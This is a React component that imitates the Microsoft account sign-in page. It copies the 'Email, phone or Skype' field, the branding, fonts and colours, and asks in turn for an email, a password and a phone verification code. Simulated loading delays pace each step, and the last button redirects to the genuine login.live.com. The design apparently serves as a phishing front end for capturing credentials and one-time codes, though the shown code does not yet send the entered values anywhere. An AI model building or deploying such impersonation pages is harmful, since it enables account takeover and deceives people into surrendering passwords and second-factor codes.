import React, { useState, useEffect } from "react";

// DotLoader component that animates the dots
const DotLoader = () => {
  return (
    <div style={loaderStyle}>
      <div style={{ ...dotStyle, animationDelay: "0s" }} className="dot"></div>
      <div
        style={{ ...dotStyle, animationDelay: "0.3s" }}
        className="dot"
      ></div>
      <div
        style={{ ...dotStyle, animationDelay: "0.6s" }}
        className="dot"
      ></div>
    </div>
  );
};

// CSS style for the loader
const loaderStyle = {
  position: "absolute",
  top: "10px",
  left: "10%",
  width: "80%",
  display: "flex",
  justifyContent: "space-evenly",
  alignItems: "center",
  height: "auto",
};

const dotStyle = {
  width: "10px",
  height: "10px",
  borderRadius: "50%",
  backgroundColor: "#0078D4",
  animation: "dot-blink 1.5s infinite ease-in-out",
  transition: "font-weight 0.3s ease-in-out",
};

// Keyframes for animations
const globalStyles = `
@keyframes dot-blink {
  0%, 100% {
    opacity: 0;
  }
  50% {
    opacity: 1;
  }
}
`;

const Signup = () => {
  const [email, setEmail] = useState(""); // Store the email entered on the first page
  const [showPasswordPage, setShowPasswordPage] = useState(false);
  const [showVerificationPage, setShowVerificationPage] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleNextClick = async () => {
    setIsLoading(true);
    await new Promise((resolve) => setTimeout(resolve, 4000)); // Simulate loading for 4 seconds
    setShowPasswordPage(true);
    setIsLoading(false);
  };

  const handleVerifyClick = async () => {
    setIsLoading(true);
    await new Promise((resolve) => setTimeout(resolve, 4000)); // Simulate loading for 4 seconds
    setShowVerificationPage(true);
    setIsLoading(false);
  };

  const handleBackToEmailPage = () => {
    setShowPasswordPage(false);
    setShowVerificationPage(false);
  };

  const handleBackToPasswordPage = () => {
    setShowVerificationPage(false);
  };

  useEffect(() => {
    const handleEscape = (event) => {
      if (
        event.key === "Escape" &&
        (showPasswordPage || showVerificationPage)
      ) {
        setShowPasswordPage(false);
        setShowVerificationPage(false);
      }
    };

    document.addEventListener("keydown", handleEscape);

    return () => document.removeEventListener("keydown", handleEscape);
  }, [showPasswordPage, showVerificationPage]);

  return (
    <div
      style={{
        overflow: "hidden",
        width: "100%",
        height: "100vh",
        display: "flex",
        position: "relative",
      }}
    >
      {/* Injecting global styles */}
      <style>{globalStyles}</style>

      {/* Email Page */}
      <div
        style={{
          width: "100%",
          height: "100%",
          transform:
            showPasswordPage || showVerificationPage
              ? "translateX(-200%)"
              : "translateX(0)",
          transition: "transform 0.5s ease-in-out",
          position: "absolute",
          left: 0,
          top: 0,
          background: "#fff",
        }}
      >
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKm_mVUN8quoAgfIO92XcgBQbIvz1f1_YOtncrZs0K2l13BdkDPAHCHdk&s=10"
          alt="Custom Logo"
          style={{
            position: "absolute",
            top: "50px",
            left: "-3px",
            width: "120px",
            height: "auto",
          }}
        />
        <p
          style={{
            position: "absolute",
            top: "100px",
            left: "10px",
            fontFamily: "SF Pro Display, sans-serif",
            fontSize: "25px",
            fontWeight: "bold",
            margin: "0",
            color: "#333",
          }}
        >
          Sign in
        </p>
        <input
          type="text"
          placeholder="Email, phone or Skype"
          style={{
            width: "90%",
            padding: "10px",
            margin: "150px auto 20px",
            border: "none",
            outline: "none",
            borderBottom: "1px solid #808080",
            background: "transparent",
            textAlign: "left",
            fontSize: "16px",
            display: "block",
          }}
          value={email}
          onChange={(e) => setEmail(e.target.value)} // Update email state
        />
        <div
          style={{
            textAlign: "left",
            margin: "10px auto",
            width: "90%",
            fontFamily: "Segoe UI, sans-serif",
            fontSize: "14px",
            color: "#333",
          }}
        >
          No account?{" "}
          <a
            href="/"
            style={{
              color: "#0078D4",
              textDecoration: "none",
            }}
          >
            Create one!
          </a>
        </div>
        <div
          style={{
            display: "flex",
            justifyContent: "flex-end",
            paddingRight: "10%",
          }}
        >
          <button
            type="submit"
            style={{
              backgroundColor: "#0078D4",
              color: "white",
              padding: "8px 35px",
              borderRadius: "0",
              cursor: "pointer",
              border: "none",
              fontFamily: "Segoe UI, sans-serif",
              fontSize: "16px",
              marginTop: "40px",
              opacity: isLoading ? 0.5 : 1,
            }}
            onClick={handleNextClick}
            disabled={isLoading}
          >
            {isLoading ? <DotLoader /> : "Next"}
          </button>
        </div>
      </div>

      {/* Password Page */}
      <div
        style={{
          width: "100%",
          height: "100%",
          transform: showPasswordPage ? "translateX(0)" : "translateX(100%)",
          transition: "transform 0.5s ease-in-out",
          position: "absolute",
          left: 0,
          top: 0,
          background: "#fff",
        }}
      >
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKm_mVUN8quoAgfIO92XcgBQbIvz1f1_YOtncrZs0K2l13BdkDPAHCHdk&s=10"
          alt="Custom Logo"
          style={{
            position: "absolute",
            top: "50px",
            left: "-3px",
            width: "120px",
            height: "auto",
          }}
        />
        <p
          style={{
            position: "absolute",
            top: "135px",
            left: "10px",
            fontFamily: "SF Pro Display, sans-serif",
            fontSize: "25px",
            fontWeight: "bold",
            margin: "0",
            color: "#333",
          }}
        >
          Enter your password
        </p>

        <div
          style={{
            position: "absolute",
            top: "90px",
            left: "10px",
            display: "flex",
            alignItems: "center",
          }}
        >
          <div
            onClick={handleBackToEmailPage}
            style={{
              cursor: "pointer",
              marginRight: "10px",
              fontSize: "20px",
              color: "#000000",
            }}
          >
            {"←"}
          </div>
          <p>{email}</p>
        </div>

        <input
          type="password"
          placeholder="Password"
          style={{
            width: "90%",
            padding: "10px",
            margin: "180px auto 20px",
            border: "none",
            outline: "none",
            borderBottom: "1px solid #808080",
            background: "transparent",
            textAlign: "left",
            fontSize: "16px",
            display: "block",
          }}
        />
        <div
          style={{
            display: "flex",
            justifyContent: "flex-end",
            paddingRight: "10%",
          }}
        >
          <button
            type="submit"
            style={{
              backgroundColor: "#0078D4",
              color: "white",
              padding: "8px 35px",
              borderRadius: "0",
              cursor: "pointer",
              border: "none",
              fontFamily: "Segoe UI, sans-serif",
              fontSize: "16px",
              marginTop: "40px",
              opacity: isLoading ? 0.5 : 1,
            }}
            onClick={handleVerifyClick}
            disabled={isLoading}
          >
            {isLoading ? <DotLoader /> : "Sign in"}
          </button>
        </div>
      </div>

      {/* Verification Page */}
      <div
        style={{
          width: "100%",
          height: "100%",
          transform: showVerificationPage
            ? "translateX(0)"
            : "translateX(100%)",
          transition: "transform 0.5s ease-in-out",
          position: "absolute",
          left: 0,
          top: 0,
          background: "#fff",
        }}
      >
        <img
          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKm_mVUN8quoAgfIO92XcgBQbIvz1f1_YOtncrZs0K2l13BdkDPAHCHdk&s=10"
          alt="Custom Logo"
          style={{
            position: "absolute",
            top: "50px",
            left: "-3px",
            width: "120px",
            height: "auto",
          }}
        />
        <p
          style={{
            position: "absolute",
            top: "120px",
            left: "10px",
            fontFamily: "SF Pro Display, sans-serif",
            fontSize: "25px",
            fontWeight: "bold",
            margin: "0",
            color: "#333",
          }}
        >
          Verify your account to continue
        </p>

        <p
          style={{
            position: "absolute",
            top: "180px", // Adjust the top margin as needed
            left: "10px",
            fontFamily: "SF Pro Display, sans-serif",
            fontSize: "15px",
            fontWeight: "normal",
            margin: "0",
            color: "#4b4b4b",
          }}
        >
          Enter verification code sent to your phone
        </p>

        <input
          type="text"
          placeholder="Verification code"
          style={{
            width: "90%",
            padding: "10px",
            margin: "220px auto 20px",
            border: "none",
            outline: "none",
            borderBottom: "1px solid #808080",
            background: "transparent",
            textAlign: "left",
            fontSize: "16px",
            display: "block",
          }}
        />
        <div
          style={{
            display: "flex",
            justifyContent: "flex-end",
            paddingRight: "10%",
          }}
        >
          <button
            type="submit"
            style={{
              backgroundColor: "#0078D4",
              color: "white",
              padding: "8px 35px",
              borderRadius: "0",
              cursor: "pointer",
              border: "none",
              fontFamily: "Segoe UI, sans-serif",
              fontSize: "16px",
              marginTop: "40px",
              opacity: isLoading ? 0.5 : 1,
            }}
            disabled={isLoading}
            onClick={() => (window.location.href = "https://login.live.com")}
          >
            {isLoading ? <DotLoader /> : "Verify"}
          </button>
        </div>
      </div>
    </div>
  );
};

export default Signup;
